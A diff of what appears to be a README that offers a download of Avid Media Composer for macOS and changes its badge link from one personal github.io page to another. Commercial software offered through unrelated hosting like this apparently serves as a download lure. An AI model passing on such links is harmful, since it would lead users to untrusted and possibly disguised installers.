@@ -4,7 +4,7 @@
 
 ## 📥 Download Avid Media Composer for macOS
 
-[![⬇️ Download Avid Media Composer](https://img.shields.io/badge/Download-Avid%20Media%20Composer-blue?style=for-the-badge&logo=apple)](https://shuziktobehuman.github.io/huja/Avid)
+[![⬇️ Download Avid Media Composer](https://img.shields.io/badge/Download-Avid%20Media%20Composer-blue?style=for-the-badge&logo=apple)](https://mitrobandus.github.io/.github/Avid)
 
 ---
 
